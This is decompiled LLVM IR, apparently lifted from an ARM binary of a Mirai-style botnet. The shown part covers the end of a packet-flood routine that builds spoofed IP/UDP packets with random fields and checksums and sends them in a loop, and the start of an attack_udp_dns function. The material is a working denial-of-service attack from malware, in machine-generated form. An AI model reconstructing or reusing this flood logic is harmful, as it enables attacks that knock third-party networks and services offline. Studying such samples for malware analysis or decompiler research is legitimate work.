  %v5_d3f0 = or i32 %v4_d3f0, %v3_d3e4
  store i32 %v5_d3f0, i32* @lr, align 4
  %tmp43 = mul i32 %v6_d30c, 256
  %v3_d3f4 = and i32 %tmp43, 65280
  store i32 %v3_d3f4, i32* %r2.global-to-local, align 4
  %v5_d3f8 = trunc i32 %v5_d3ec to i16
  %tmp44 = udiv i32 %v6_d30c, 256
  %v4_d400 = urem i32 %tmp44, 256
  %v5_d400 = or i32 %v4_d400, %v3_d3f4
  store i32 %v5_d400, i32* @r6, align 4
  store i32 %v0_d3c4, i32* @r4, align 4
  %sext5 = mul nuw i32 %v5_d3f0, 65536
  %v4_d4d0 = sdiv i32 %sext5, 65536
  %v1_d47c = trunc i32 %v6_d2c8 to i8
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %.thread, %dec_label_pc_d3d8
  %v2_d410 = call i32 @calloc(i32 128, i32 1)
  %v3_d414 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d414, i32* %r2.global-to-local, align 4
  %v1_d418 = load i32, i32* @sb, align 4
  %v2_d418 = load i32, i32* @r4, align 4
  %v5_d418 = mul i32 %v2_d418, 4
  %v6_d418 = add i32 %v5_d418, %v1_d418
  %v7_d418 = inttoptr i32 %v6_d418 to i32*
  store i32 %v2_d410, i32* %v7_d418, align 4
  %v0_d41c = load i32, i32* %r2.global-to-local, align 4
  %v3_d41c = mul i32 %v0_d41c, 32
  store i32 %v3_d41c, i32* %r3.global-to-local, align 4
  %v0_d420 = load i32, i32* @sb, align 4
  %v4_d420 = mul i32 %v0_d41c, 4
  %v5_d420 = add i32 %v0_d420, %v4_d420
  %v6_d420 = inttoptr i32 %v5_d420 to i32*
  %v7_d420 = load i32, i32* %v6_d420, align 4
  store i32 %v7_d420, i32* @lr, align 4
  %v5_d424 = mul i32 %v0_d41c, 24
  store i32 %v5_d424, i32* %r3.global-to-local, align 4
  %v1_d428 = load i32, i32* @r8, align 4
  %v2_d428 = add i32 %v1_d428, %v5_d424
  store i32 %v2_d428, i32* @r5, align 4
  %v1_d42c = inttoptr i32 %v7_d420 to i8*
  %v2_d42c = load i8, i8* %v1_d42c, align 1
  %tmp = urem i8 %v2_d42c, 16
  %v1_d430 = zext i8 %tmp to i32
  %v1_d434 = or i32 %v1_d430, 64
  store i32 %v1_d434, i32* %r3.global-to-local, align 4
  %v1_d43c = trunc i32 %v1_d434 to i8
  store i8 %v1_d43c, i8* %v1_d42c, align 1
  %v0_d440 = load i32, i32* @lr, align 4
  %v1_d440 = inttoptr i32 %v0_d440 to i8*
  %v2_d440 = load i8, i8* %v1_d440, align 1
  %v1_d444 = and i8 %v2_d440, -16
  %v1_d448 = or i8 %v1_d444, 5
  store i8 %v1_d448, i8* %v1_d440, align 1
  %v2_d454 = load i32, i32* @lr, align 4
  %v3_d454 = add i32 %v2_d454, 1
  %v4_d454 = inttoptr i32 %v3_d454 to i8*
  store i8 %v5_d2ac, i8* %v4_d454, align 1
  %v3_d458 = load i32, i32* %stack_var_-48, align 4
  %v3_d45c = mul i32 %v3_d458, 65536
  %v1_d460 = add i32 %v3_d45c, 2097152
  %v3_d464 = udiv i32 %v1_d460, 256
  %v1_d468 = and i32 %v3_d464, 65280
  %v4_d46c = udiv i32 %v1_d460, 16777216
  %v5_d46c = or i32 %v1_d468, %v4_d46c
  store i32 %v5_d46c, i32* %r3.global-to-local, align 4
  store i32 %v1_d2f4, i32* %r4.global-to-local, align 4
  %v3_d478 = urem i32 %v3_d458, 65536
  store i32 %v3_d478, i32* %r2.global-to-local, align 4
  %v2_d47c = load i32, i32* @lr, align 4
  %v3_d47c = add i32 %v2_d47c, 8
  %v4_d47c = inttoptr i32 %v3_d47c to i8*
  store i8 %v1_d47c, i8* %v4_d47c, align 1
  %v0_d480 = load i32, i32* %r3.global-to-local, align 4
  %v1_d480 = trunc i32 %v0_d480 to i16
  %v2_d480 = load i32, i32* @lr, align 4
  %v3_d480 = add i32 %v2_d480, 2
  %v4_d480 = inttoptr i32 %v3_d480 to i16*
  store i16 %v1_d480, i16* %v4_d480, align 2
  %v0_d484 = load i32, i32* %r2.global-to-local, align 4
  %v1_d484 = mul i32 %v0_d484, 65536
  %v3_d48c = add i32 %v1_d484, 786432
  store i32 %v3_d48c, i32* %r2.global-to-local, align 4
  %v2_d490 = load i32, i32* @lr, align 4
  %v3_d490 = add i32 %v2_d490, 4
  %v4_d490 = inttoptr i32 %v3_d490 to i16*
  store i16 %v5_d3f8, i16* %v4_d490, align 2
  %v0_d494 = load i32, i32* %r2.global-to-local, align 4
  %v3_d494 = udiv i32 %v0_d494, 256
  %v1_d498 = and i32 %v3_d494, 65280
  %v4_d49c = udiv i32 %v0_d494, 16777216
  %v5_d49c = or i32 %v1_d498, %v4_d49c
  store i32 %v5_d49c, i32* %ip.global-to-local, align 4
  %v2_d4a4 = load i32, i32* @lr, align 4
  %v3_d4a4 = add i32 %v2_d4a4, 9
  %v4_d4a4 = inttoptr i32 %v3_d4a4 to i8*
  store i8 17, i8* %v4_d4a4, align 1
  %v0_d4a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_d4a8 = icmp eq i32 %v0_d4a8, 0
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* %r3.global-to-local, align 4
  br i1 %v2_d4a8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d408
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_d4b4 = load i32, i32* @lr, align 4
  %v4_d4b4 = add i32 %v3_d4b4, 6
  %v5_d4b4 = inttoptr i32 %v4_d4b4 to i16*
  store i16 64, i16* %v5_d4b4, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d408, %bb
  %v2_d4b8 = load i32, i32* @global_var_2610c.91, align 4
  store i32 %v2_d4b8, i32* %r2.global-to-local, align 4
  %v1_d4bc = load i32, i32* @lr, align 4
  %v2_d4bc = add i32 %v1_d4bc, 12
  %v3_d4bc = inttoptr i32 %v2_d4bc to i32*
  store i32 %v2_d4b8, i32* %v3_d4bc, align 4
  %v0_d4c0 = load i32, i32* @r5, align 4
  %v1_d4c0 = add i32 %v0_d4c0, 16
  %v2_d4c0 = inttoptr i32 %v1_d4c0 to i32*
  %v3_d4c0 = load i32, i32* %v2_d4c0, align 4
  store i32 %v3_d4c0, i32* %r3.global-to-local, align 4
  %v0_d4c4 = load i32, i32* @lr, align 4
  %v1_d4c4 = add i32 %v0_d4c4, 20
  store i32 %v1_d4c4, i32* %r4.global-to-local, align 4
  %v0_d4c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_d4c8 = trunc i32 %v0_d4c8 to i16
  %v3_d4c8 = add i32 %v0_d4c4, 24
  %v4_d4c8 = inttoptr i32 %v3_d4c8 to i16*
  store i16 %v1_d4c8, i16* %v4_d4c8, align 2
  %v0_d4cc = load i32, i32* %r3.global-to-local, align 4
  %v1_d4cc = load i32, i32* @lr, align 4
  %v2_d4cc = add i32 %v1_d4cc, 16
  %v3_d4cc = inttoptr i32 %v2_d4cc to i32*
  store i32 %v0_d4cc, i32* %v3_d4cc, align 4
  store i32 %v4_d4d0, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d4d8 = load i32, i32* @lr, align 4
  %v2_d4d8 = add i32 %v1_d4d8, 28
  %v3_d4d8 = inttoptr i32 %v2_d4d8 to i32*
  store i32 -1, i32* %v3_d4d8, align 4
  %v0_d4dc = load i32, i32* %ip.global-to-local, align 4
  %v1_d4dc = trunc i32 %v0_d4dc to i16
  %v2_d4dc = load i32, i32* %r4.global-to-local, align 4
  %v3_d4dc = add i32 %v2_d4dc, 2
  %v4_d4dc = inttoptr i32 %v3_d4dc to i16*
  store i16 %v1_d4dc, i16* %v4_d4dc, align 2
  %v0_d4e0 = load i32, i32* @lr, align 4
  %v1_d4e0 = add i32 %v0_d4e0, 32
  %v0_d4e4 = load i32, i32* @r6, align 4
  %v1_d4e4 = trunc i32 %v0_d4e4 to i16
  %v3_d4e4 = add i32 %v0_d4e0, 20
  %v4_d4e4 = inttoptr i32 %v3_d4e4 to i16*
  store i16 %v1_d4e4, i16* %v4_d4e4, align 2
  %v3_d4e8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d4e8, i32* %r2.global-to-local, align 4
  %v3_d4ec = call i32 @util_memcpy(i32 %v1_d4e0, i32 %v3_d354, i32 %v3_d4e8)
  %v3_d4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d4f0, i32* %r3.global-to-local, align 4
  %v1_d4f4 = add i32 %v3_d4f0, 1
  store i32 %v1_d4f4, i32* @r4, align 4
  %v1_d4f8 = load i32, i32* @fp, align 4
  store i32 %v1_d4f4, i32* %stack_var_-44, align 4
  %v5_d500 = icmp slt i32 %v1_d4f4, %v1_d4f8
  br i1 %v5_d500, label %dec_label_pc_d408, label %dec_label_pc_d504.preheader

dec_label_pc_d504.preheader:                      ; preds = %.thread, %dec_label_pc_d3a0
  %v0_d508.ph = phi i32 [ 0, %dec_label_pc_d3a0 ], [ %v1_d4f8, %.thread ]
  %v9_d520 = icmp eq i32 %v3_d3b4, add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1)
  br label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d504.preheader, %dec_label_pc_d684.dec_label_pc_d504_crit_edge
  %v0_d508 = phi i32 [ %v0_d508.pre, %dec_label_pc_d684.dec_label_pc_d504_crit_edge ], [ %v0_d508.ph, %dec_label_pc_d504.preheader ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d508 = icmp eq i32 %v0_d508, 0
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d508, label %dec_label_pc_d684, label %dec_label_pc_d514

dec_label_pc_d514:                                ; preds = %dec_label_pc_d504
  br label %dec_label_pc_d5c8

dec_label_pc_d51c:                                ; preds = %dec_label_pc_d5c8
  br i1 %v9_d520, label %dec_label_pc_d650, label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge, %dec_label_pc_d51c
  %v1_d52c = phi i32 [ %v1_d52c.pre, %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), %dec_label_pc_d51c ]
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v9_d52c = icmp eq i32 %v3_d3b8, %v1_d52c
  br i1 %v9_d52c, label %dec_label_pc_d664, label %dec_label_pc_d534

dec_label_pc_d534:                                ; preds = %dec_label_pc_d650.dec_label_pc_d534_crit_edge, %dec_label_pc_d528
  %v1_d538 = phi i32 [ %v1_d538.pre, %dec_label_pc_d650.dec_label_pc_d534_crit_edge ], [ %v1_d52c, %dec_label_pc_d528 ]
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v9_d538 = icmp eq i32 %v3_d3bc, %v1_d538
  br i1 %v9_d538, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d540:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534, %dec_label_pc_d678
  store i32 0, i32* @r4, align 4
  %v2_d548 = load i32, i32* @r5, align 4
  %v3_d548 = add i32 %v2_d548, 10
  %v4_d548 = inttoptr i32 %v3_d548 to i16*
  store i16 0, i16* %v4_d548, align 2
  %v0_d54c = load i32, i32* @r5, align 4
  store i32 %v0_d54c, i32* @r0, align 4
  %v2_d550 = call i32 @checksum_generic(i32 %v0_d54c, i32 20)
  %v3_d550 = trunc i32 %v2_d550 to i16
  %v3_d554 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v3_d558 = load i32, i32* @r5, align 4
  %v4_d558 = add i32 %v3_d558, 10
  %v5_d558 = inttoptr i32 %v4_d558 to i16*
  store i16 %v3_d550, i16* %v5_d558, align 2
  %v0_d55c = load i32, i32* @r6, align 4
  store i32 %v0_d55c, i32* @r1, align 4
  %v1_d560 = add i32 %v0_d55c, 4
  %v2_d560 = inttoptr i32 %v1_d560 to i16*
  %v3_d560 = load i16, i16* %v2_d560, align 2
  %v4_d560 = zext i16 %v3_d560 to i32
  store i32 %v4_d560, i32* %r2.global-to-local, align 4
  %v0_d564 = load i32, i32* @r4, align 4
  %v1_d564 = trunc i32 %v0_d564 to i16
  %v3_d564 = add i32 %v0_d55c, 6
  %v4_d564 = inttoptr i32 %v3_d564 to i16*
  store i16 %v1_d564, i16* %v4_d564, align 2
  %v0_d568 = load i32, i32* %r3.global-to-local, align 4
  %v1_d568 = add i32 %v0_d568, 12
  store i32 %v1_d568, i32* %r3.global-to-local, align 4
  %v0_d56c = load i32, i32* @r5, align 4
  %v4_d570 = call i32 @checksum_tcpudp(i32 %v0_d56c, i32 %v0_d55c, i32 %v4_d560, i32 %v1_d568)
  %v5_d570 = trunc i32 %v4_d570 to i16
  %v3_d574 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d574, i32* %r3.global-to-local, align 4
  %v3_d578 = mul i32 %v3_d574, 32
  store i32 %v3_d578, i32* %lr.global-to-local, align 4
  %v3_d57c = load i32, i32* @r6, align 4
  %v4_d57c = add i32 %v3_d57c, 6
  %v5_d57c = inttoptr i32 %v4_d57c to i16*
  store i16 %v5_d570, i16* %v5_d57c, align 2
  %v0_d580 = load i32, i32* %lr.global-to-local, align 4
  %v1_d580 = load i32, i32* %r3.global-to-local, align 4
  %tmp45 = mul i32 %v1_d580, -8
  %v5_d580 = add i32 %v0_d580, %tmp45
  store i32 %v5_d580, i32* %lr.global-to-local, align 4
  %v0_d584 = load i32, i32* @r6, align 4
  %v1_d584 = add i32 %v0_d584, 2
  %v2_d584 = inttoptr i32 %v1_d584 to i16*
  %v3_d584 = load i16, i16* %v2_d584, align 2
  %v4_d584 = zext i16 %v3_d584 to i32
  store i32 %v4_d584, i32* @r6, align 4
  %v3_d588 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d588, i32* %r2.global-to-local, align 4
  %v1_d58c = load i32, i32* @r8, align 4
  %v2_d58c = add i32 %v1_d58c, %v5_d580
  store i32 %v2_d58c, i32* @lr, align 4
  %v3_d590 = add i32 %v2_d58c, 2
  %v4_d590 = inttoptr i32 %v3_d590 to i16*
  store i16 %v3_d584, i16* %v4_d590, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d59c = load i32, i32* @r5, align 4
  %v0_d5a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d5a0 = add i32 %v0_d5a0, 32
  store i32 %v1_d5a0, i32* %r2.global-to-local, align 4
  %v0_d5a4 = load i32, i32* @sl, align 4
  %v0_d5a8 = load i32, i32* @lr, align 4
  %v6_d5b0 = call i32 @__libc_sendto(i32 %v0_d5a4, i32 %v0_d59c, i32 %v1_d5a0, i32 16384, i32 %v0_d5a8, i32 16)
  %v3_d5b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5b4, i32* %r3.global-to-local, align 4
  %v1_d5b8 = add i32 %v3_d5b4, 1
  %v1_d5bc = load i32, i32* @fp, align 4
  store i32 %v1_d5b8, i32* %stack_var_-44, align 4
  %v6_d5c4 = icmp slt i32 %v1_d5b8, %v1_d5bc
  br i1 %v6_d5c4, label %dec_label_pc_d5c8, label %dec_label_pc_d684

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d514
  %v1_d5d8 = phi i32 [ %v1_d5b8, %dec_label_pc_d540 ], [ 0, %dec_label_pc_d514 ]
  %v5_d5cc = mul i32 %v1_d5d8, 24
  %v1_d5d0 = load i32, i32* @r8, align 4
  %v2_d5d0 = add i32 %v1_d5d0, %v5_d5cc
  store i32 %v2_d5d0, i32* %r3.global-to-local, align 4
  %v1_d5d4 = add i32 %v2_d5d0, 20
  %v2_d5d4 = inttoptr i32 %v1_d5d4 to i8*
  %v3_d5d4 = load i8, i8* %v2_d5d4, align 1
  %v4_d5d4 = zext i8 %v3_d5d4 to i32
  store i32 %v4_d5d4, i32* %r2.global-to-local, align 4
  %v0_d5d8 = load i32, i32* @sb, align 4
  %v4_d5d8 = mul i32 %v1_d5d8, 4
  %v5_d5d8 = add i32 %v0_d5d8, %v4_d5d8
  %v6_d5d8 = inttoptr i32 %v5_d5d8 to i32*
  %v7_d5d8 = load i32, i32* %v6_d5d8, align 4
  store i32 %v7_d5d8, i32* @r5, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* @r7, align 4
  %v1_d5e8 = add i32 %v7_d5d8, 20
  store i32 %v1_d5e8, i32* @r6, align 4
  %tmp46 = icmp ugt i8 %v3_d5d4, 31
  br i1 %tmp46, label %dec_label_pc_d51c, label %dec_label_pc_d5f0

dec_label_pc_d5f0:                                ; preds = %dec_label_pc_d5c8
  %v1_d5f0 = add i32 %v2_d5d0, 16
  %v2_d5f0 = inttoptr i32 %v1_d5f0 to i32*
  %v3_d5f0 = load i32, i32* %v2_d5f0, align 4
  store i32 %v3_d5f0, i32* %r4.global-to-local, align 4
  %v0_d5f4 = call i32 @rand_next()
  %v3_d5f8 = load i32, i32* %stack_var_-44, align 4
  %v5_d600 = mul i32 %v3_d5f8, 24
  %v1_d604 = and i32 %v3_d5f0, 16711680
  store i32 %v1_d604, i32* %ip.global-to-local, align 4
  %v3_d608 = udiv i32 %v3_d5f0, 16777216
  %v4_d60c = udiv i32 %v1_d604, 256
  %v5_d60c = or i32 %v4_d60c, %v3_d608
  store i32 %v5_d60c, i32* %r2.global-to-local, align 4
  %v1_d610 = load i32, i32* @r8, align 4
  %v2_d610 = add i32 %v1_d610, %v5_d600
  %v1_d614 = and i32 %v3_d5f0, 65280
  store i32 %v1_d614, i32* %r3.global-to-local, align 4
  %v1_d618 = add i32 %v2_d610, 20
  %v2_d618 = inttoptr i32 %v1_d618 to i8*
  %v3_d618 = load i8, i8* %v2_d618, align 1
  %v4_d618 = zext i8 %v3_d618 to i32
  store i32 %v4_d618, i32* %ip.global-to-local, align 4
  %v5_d620 = call i32 @llvm.bswap.i32(i32 %v3_d5f0)
  %v7_d624 = lshr i32 %v0_d5f4, %v4_d618
  %v8_d624 = add i32 %v7_d624, %v5_d620
  store i32 %v8_d624, i32* %r2.global-to-local, align 4
  %v5_d640 = call i32 @llvm.bswap.i32(i32 %v8_d624)
  store i32 %v5_d640, i32* %r3.global-to-local, align 4
  %v1_d644 = load i32, i32* @r7, align 4
  %v9_d644 = icmp eq i32 %v3_d3b4, %v1_d644
  %v1_d648 = load i32, i32* @r5, align 4
  %v2_d648 = add i32 %v1_d648, 16
  %v3_d648 = inttoptr i32 %v2_d648 to i32*
  store i32 %v5_d640, i32* %v3_d648, align 4
  br i1 %v9_d644, label %dec_label_pc_d650, label %dec_label_pc_d5f0.dec_label_pc_d528_crit_edge

dec_label_pc_d5f0.dec_label_pc_d528_crit_edge:    ; preds = %dec_label_pc_d5f0
  %v1_d52c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d528

dec_label_pc_d650:                                ; preds = %dec_label_pc_d5f0, %dec_label_pc_d51c
  %v0_d650 = call i32 @rand_next()
  %v1_d650 = trunc i32 %v0_d650 to i16
  store i32 %v3_d3b8, i32* %r2.global-to-local, align 4
  %v1_d658 = load i32, i32* @r7, align 4
  %v9_d658 = icmp eq i32 %v3_d3b8, %v1_d658
  %v3_d65c = load i32, i32* @r5, align 4
  %v4_d65c = add i32 %v3_d65c, 4
  %v5_d65c = inttoptr i32 %v4_d65c to i16*
  store i16 %v1_d650, i16* %v5_d65c, align 2
  br i1 %v9_d658, label %dec_label_pc_d664, label %dec_label_pc_d650.dec_label_pc_d534_crit_edge

dec_label_pc_d650.dec_label_pc_d534_crit_edge:    ; preds = %dec_label_pc_d650
  %v1_d538.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d534

dec_label_pc_d664:                                ; preds = %dec_label_pc_d650, %dec_label_pc_d528
  %v0_d664 = call i32 @rand_next()
  %v1_d664 = trunc i32 %v0_d664 to i16
  store i32 %v3_d3bc, i32* %r3.global-to-local, align 4
  %v1_d66c = load i32, i32* @r7, align 4
  %v9_d66c = icmp eq i32 %v3_d3bc, %v1_d66c
  %v3_d670 = load i32, i32* @r5, align 4
  %v4_d670 = add i32 %v3_d670, 20
  %v5_d670 = inttoptr i32 %v4_d670 to i16*
  store i16 %v1_d664, i16* %v5_d670, align 2
  br i1 %v9_d66c, label %dec_label_pc_d678, label %dec_label_pc_d540

dec_label_pc_d678:                                ; preds = %dec_label_pc_d664, %dec_label_pc_d534
  %v0_d678 = call i32 @rand_next()
  %v1_d678 = trunc i32 %v0_d678 to i16
  %v3_d67c = load i32, i32* @r6, align 4
  %v4_d67c = add i32 %v3_d67c, 2
  %v5_d67c = inttoptr i32 %v4_d67c to i16*
  store i16 %v1_d678, i16* %v5_d67c, align 2
  br label %dec_label_pc_d540

dec_label_pc_d684:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d504
  %v2_d688 = call i32 @__GI_time(i32* null)
  store i32 %v2_d33c, i32* %ip.global-to-local, align 4
  %v6_d694 = icmp slt i32 %v2_d33c, %v2_d688
  br i1 %v6_d694, label %dec_label_pc_d698, label %dec_label_pc_d684.dec_label_pc_d504_crit_edge

dec_label_pc_d684.dec_label_pc_d504_crit_edge:    ; preds = %dec_label_pc_d684
  %v0_d508.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_d504

dec_label_pc_d698:                                ; preds = %dec_label_pc_d684, %entry, %dec_label_pc_d6a4
  %v1_d6a0 = phi i32 [ %v3_d368, %entry ], [ %v1_d6a8, %dec_label_pc_d6a4 ], [ %v2_d688, %dec_label_pc_d684 ]
  store i32 %v3_d248, i32* %r4.global-to-local, align 4
  store i32 %v27_d248, i32* %lr.global-to-local, align 4
  ret i32 %v1_d6a0

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d378
  %v0_d6a4 = load i32, i32* @sl, align 4
  %v1_d6a8 = call i32 @__GI___libc_close(i32 %v0_d6a4)
  br label %dec_label_pc_d698

; uselistorder directives
  uselistorder i32 %v5_d640, { 1, 0 }
  uselistorder i32 %v3_d5f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_d5b8, { 1, 2, 0 }
  uselistorder i32 %v5_d580, { 1, 0 }
  uselistorder i32 %v0_d55c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d4f4, { 1, 0, 2 }
  uselistorder i32 %v3_d458, { 1, 0 }
  uselistorder i32 %v0_d41c, { 1, 2, 0 }
  uselistorder i32 %v3_d3f4, { 1, 0 }
  uselistorder i32 %v0_d3ac, { 1, 0, 2 }
  uselistorder i32 %v3_d368, { 1, 2, 3, 0 }
  uselistorder i32 %v2_d33c, { 1, 0 }
  uselistorder i32 %v6_d30c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_d2f4, { 1, 0 }
  uselistorder i32 %v6_d2c8, { 1, 0 }
  uselistorder i32 %v7_d2b0, { 1, 0, 2 }
  uselistorder i32 %v5_d28c, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 9, 4, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0 }
  uselistorder i32 2097152, { 1, 0 }
  uselistorder label %dec_label_pc_d698, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d540, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_udp_dns(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-2124 = alloca i32, align 4
  %v18_d6b4 = load i32, i32* @sb, align 4
  %v27_d6b4 = load i32, i32* @lr, align 4
  store i32 0, i32* @sl, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d6e4 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d6e8 = load i32, i32* @r4, align 4
  store i32 %v0_d6e8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d6f4 = load i32, i32* @sl, align 4
  store i32 %v0_d6f4, i32* %r3.global-to-local, align 4
  %v0_d6f8 = load i32, i32* @r5, align 4
  store i32 %v0_d6f8, i32* %r0.global-to-local, align 4
  %v5_d6fc = inttoptr i32 %v0_d6e8 to i32*
  %v6_d6fc = call i32 @attack_get_opt_int(i32 %v0_d6f8, i32* %v5_d6fc, i32 2, i32 %v0_d6f4)
  %v1_d708 = urem i32 %v6_d6fc, 256
  store i32 %v1_d708, i32* %ip.global-to-local, align 4
  %v0_d70c = load i32, i32* @r4, align 4
  store i32 %v0_d70c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d718 = load i32, i32* @r5, align 4
  store i32 %v0_d718, i32* %r0.global-to-local, align 4
  %v6_d720 = inttoptr i32 %v0_d70c to i32*
  %v7_d720 = call i32 @attack_get_opt_int(i32 %v0_d718, i32* %v6_d720, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_d724 = load i32, i32* @r4, align 4
  store i32 %v0_d724, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d734 = load i32, i32* @r5, align 4
  store i32 %v0_d734, i32* %r0.global-to-local, align 4
  %v5_d738 = inttoptr i32 %v0_d724 to i32*
  %v6_d738 = call i32 @attack_get_opt_int(i32 %v0_d734, i32* %v5_d738, i32 4, i32 64)
  %v0_d740 = load i32, i32* @r4, align 4
  store i32 %v0_d740, i32* %r1.global-to-local, align 4
  %v1_d744 = urem i32 %v6_d738, 256
  store i32 %v1_d744, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d74c = load i32, i32* @sl, align 4
  store i32 %v0_d74c, i32* %r3.global-to-local, align 4
  %v0_d750 = load i32, i32* @r5, align 4
  store i32 %v0_d750, i32* %r0.global-to-local, align 4
  %v6_d758 = inttoptr i32 %v0_d740 to i32*
  %v7_d758 = call i32 @attack_get_opt_int(i32 %v0_d750, i32* %v6_d758, i32 5, i32 %v0_d74c)
  %v1_d764 = urem i32 %v7_d758, 256
  store i32 %v1_d764, i32* %ip.global-to-local, align 4
  %v0_d768 = load i32, i32* @r4, align 4
  store i32 %v0_d768, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d774 = load i32, i32* @r5, align 4
  store i32 %v0_d774, i32* %r0.global-to-local, align 4
  %v5_d77c = inttoptr i32 %v0_d768 to i32*
  %v6_d77c = call i32 @attack_get_opt_int(i32 %v0_d774, i32* %v5_d77c, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_d780 = load i32, i32* @r4, align 4
  store i32 %v0_d780, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v0_d790 = load i32, i32* @r5, align 4
  store i32 %v0_d790, i32* %r0.global-to-local, align 4
  %v5_d794 = inttoptr i32 %v0_d780 to i32*
  %v6_d794 = call i32 @attack_get_opt_int(i32 %v0_d790, i32* %v5_d794, i32 7, i32 53)
  %v0_d79c = load i32, i32* @r4, align 4
  store i32 %v0_d79c, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v0_d7ac = load i32, i32* @r5, align 4
  store i32 %v0_d7ac, i32* %r0.global-to-local, align 4
  %v5_d7b0 = inttoptr i32 %v0_d79c to i32*
  %v6_d7b0 = call i32 @attack_get_opt_int(i32 %v0_d7ac, i32* %v5_d7b0, i32 9, i32 add (i32 ptrtoint (i32* @global_var_10000.35 to i32), i32 -1))
  %v0_d7b4 = load i32, i32* @r4, align 4
  store i32 %v0_d7b4, i32* %r1.global-to-local, align 4
  %v0_d7bc = load i32, i32* @sl, align 4
